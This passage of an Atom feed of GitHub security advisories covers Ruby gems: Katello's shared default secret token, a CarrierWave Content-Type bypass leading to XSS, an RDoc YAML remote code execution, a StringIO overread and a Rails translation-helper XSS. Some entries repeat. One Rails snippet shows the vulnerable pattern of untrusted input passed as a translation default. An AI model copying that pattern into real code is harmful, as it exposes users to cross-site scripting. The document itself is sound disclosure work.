<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3503">https://nvd.nist.gov/vuln/detail/CVE-2012-3503</a></li>
<li><a href="https://github.com/Katello/katello/pull/499">https://github.com/Katello/katello/pull/499</a></li>
<li><a href="https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3">https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1186.html">http://rhn.redhat.com/errata/RHSA-2012-1186.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1187.html">http://rhn.redhat.com/errata/RHSA-2012-1187.html</a></li>
<li><a href="https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344">https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344</a></li>
<li><a href="https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140">https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140</a></li>
<li><a href="https://github.com/advisories/GHSA-5xv2-q475-rwrh">https://github.com/advisories/GHSA-5xv2-q475-rwrh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xv2-q475-rwrh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T05:13:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[katello] Katello uses hard coded credential]]></title>
        <id>https://github.com/advisories/GHSA-5xv2-q475-rwrh</id>
        <link href="https://github.com/advisories/GHSA-5xv2-q475-rwrh"/>
        <updated>2024-04-12T18:08:37.000Z</updated>
        <content type="html"><![CDATA[<p>The installation script in Katello 1.0 and earlier does not properly generate the <code>Application.config.secret_token</code> value, which causes each default installation to have the same secret token, and allows remote attackers to authenticate to the CloudForms System Engine web interface as an arbitrary user by creating a cookie using the default <code>secret_token</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3503">https://nvd.nist.gov/vuln/detail/CVE-2012-3503</a></li>
<li><a href="https://github.com/Katello/katello/pull/499">https://github.com/Katello/katello/pull/499</a></li>
<li><a href="https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3">https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1186.html">http://rhn.redhat.com/errata/RHSA-2012-1186.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1187.html">http://rhn.redhat.com/errata/RHSA-2012-1187.html</a></li>
<li><a href="https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344">https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344</a></li>
<li><a href="https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140">https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140</a></li>
<li><a href="https://github.com/advisories/GHSA-5xv2-q475-rwrh">https://github.com/advisories/GHSA-5xv2-q475-rwrh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xv2-q475-rwrh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T05:13:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[carrierwave] CarrierWave content-Type allowlist bypass vulnerability which possibly leads to XSS remained]]></title>
        <id>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</id>
        <link href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw"/>
        <updated>2024-03-27T13:00:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The vulnerability <a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-gxhx-g4fq-49hj">CVE-2023-49090</a> wasn't fully addressed.</p>
<p>This vulnerability is caused by the fact that when uploading to object storage, including Amazon S3, it is possible to set a Content-Type value that is interpreted by browsers to be different from what's allowed by <code>content_type_allowlist</code>, by providing multiple values separated by commas.</p>
<p>This bypassed value can be used to cause XSS.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <a href="https://rubygems.org/gems/carrierwave/versions/3.0.7">3.0.7</a> or <a href="https://rubygems.org/gems/carrierwave/versions/2.2.6">2.2.6</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use the following monkey patch to let CarrierWave parse the Content-type by using <code>Marcel::MimeType.for</code>.</p>
<pre><code class="language-ruby"># For CarrierWave 3.x
CarrierWave::SanitizedFile.class_eval do
  def declared_content_type
    @declared_content_type ||
      if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
        Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
      end
  end
end
</code></pre>
<pre><code class="language-ruby"># For CarrierWave 2.x
CarrierWave::SanitizedFile.class_eval do
  def existing_content_type
    if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
      Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
    end
  end
end
</code></pre>
<h3 id="references">References</h3>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation">OWASP - File Upload Cheat Sheet</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29034">https://nvd.nist.gov/vuln/detail/CVE-2024-29034</a></li>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477">https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-25T19:40:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[carrierwave] CarrierWave content-Type allowlist bypass vulnerability which possibly leads to XSS remained]]></title>
        <id>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</id>
        <link href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw"/>
        <updated>2024-03-27T13:00:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The vulnerability <a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-gxhx-g4fq-49hj">CVE-2023-49090</a> wasn't fully addressed.</p>
<p>This vulnerability is caused by the fact that when uploading to object storage, including Amazon S3, it is possible to set a Content-Type value that is interpreted by browsers to be different from what's allowed by <code>content_type_allowlist</code>, by providing multiple values separated by commas.</p>
<p>This bypassed value can be used to cause XSS.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <a href="https://rubygems.org/gems/carrierwave/versions/3.0.7">3.0.7</a> or <a href="https://rubygems.org/gems/carrierwave/versions/2.2.6">2.2.6</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use the following monkey patch to let CarrierWave parse the Content-type by using <code>Marcel::MimeType.for</code>.</p>
<pre><code class="language-ruby"># For CarrierWave 3.x
CarrierWave::SanitizedFile.class_eval do
  def declared_content_type
    @declared_content_type ||
      if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
        Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
      end
  end
end
</code></pre>
<pre><code class="language-ruby"># For CarrierWave 2.x
CarrierWave::SanitizedFile.class_eval do
  def existing_content_type
    if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
      Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
    end
  end
end
</code></pre>
<h3 id="references">References</h3>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation">OWASP - File Upload Cheat Sheet</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29034">https://nvd.nist.gov/vuln/detail/CVE-2024-29034</a></li>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477">https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-25T19:40:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-03-25T19:37:01.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-03-25T19:37:01.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-03-25T19:37:01.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-03-25T19:37:01.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stringio] StringIO buffer overread vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v5h6-c2hv-hv3r</id>
        <link href="https://github.com/advisories/GHSA-v5h6-c2hv-hv3r"/>
        <updated>2024-03-25T19:36:52.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in StringIO 3.0.1, as distributed in Ruby 3.0.x through 3.0.6 and 3.1.x through 3.1.4.</p>
<p>The <code>ungetbyte</code> and <code>ungetc</code> methods on a StringIO can read past the end of a string, and a subsequent call to <code>StringIO.gets</code> may return the memory value.</p>
<p>This vulnerability is not affected StringIO 3.0.3 and later, and Ruby 3.2.x and later.</p>
<p>We recommend to update the StringIO gem to version 3.0.3 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>stringio</code> 3.0.1.1</li>
<li>For Ruby 3.1 users: Update to <code>stringio</code> 3.1.0.2</li>
</ul>
<p>You can use <code>gem update stringio</code> to update it. If you are using bundler, please add <code>gem "stringio", "&gt;= 3.0.1.2"</code> to your <code>Gemfile</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/stringio/commit/0e596524097706263d10900ca180898e4a8f5233">https://github.com/ruby/stringio/commit/0e596524097706263d10900ca180898e4a8f5233</a></li>
<li><a href="https://github.com/ruby/stringio/commit/c58c5f54f1eab99665ea6a161d29ff6a7490afc8">https://github.com/ruby/stringio/commit/c58c5f54f1eab99665ea6a161d29ff6a7490afc8</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/stringio/CVE-2024-27280.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/stringio/CVE-2024-27280.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/buffer-overread-cve-2024-27280">https://www.ruby-lang.org/en/news/2024/03/21/buffer-overread-cve-2024-27280</a></li>
<li><a href="https://github.com/advisories/GHSA-v5h6-c2hv-hv3r">https://github.com/advisories/GHSA-v5h6-c2hv-hv3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5h6-c2hv-hv3r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rails] Rails has possible XSS Vulnerability in Action Controller]]></title>
        <id>https://github.com/advisories/GHSA-9822-6m93-xqf4</id>
        <link href="https://github.com/advisories/GHSA-9822-6m93-xqf4"/>
        <updated>2024-03-21T21:53:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="possible-xss-vulnerability-in-action-controller">Possible XSS Vulnerability in Action Controller</h1>
<p>There is a possible XSS vulnerability when using the translation helpers
(<code>translate</code>, <code>t</code>, etc) in Action Controller. This vulnerability has been
assigned the CVE identifier CVE-2024-26143.</p>
<p>Versions Affected:  &gt;= 7.0.0.
Not affected:       &lt; 7.0.0
Fixed Versions:     7.1.3.1, 7.0.8.1</p>
<h2 id="impact">Impact</h2>
<p>Applications using translation methods like <code>translate</code>, or <code>t</code> on a
controller, with a key ending in "_html", a <code>:default</code> key which contains
untrusted user input, and the resulting string is used in a view, may be
susceptible to an XSS vulnerability.</p>
<p>For example, impacted code will look something like this:</p>
<pre><code class="language-ruby">class ArticlesController &lt; ApplicationController
  def show  
    @message = t("message_html", default: untrusted_input)
    # The `show` template displays the contents of `@message`
  end
end
</code></pre>
<p>To reiterate the pre-conditions, applications must:</p>
<ul>
<li>Use a translation function from a controller (i.e. <em>not</em> I18n.t, or <code>t</code> from
a view)</li>
<li>Use a key that ends in <code>_html</code></li>
<li>Use a default value where the default value is untrusted and unescaped input</li>
<li>Send the text to the victim (whether that's part of a template, or a
<code>render</code> call)</li>
</ul>
<p>All users running an affected release should either upgrade or use one of the
workarounds immediately.</p>
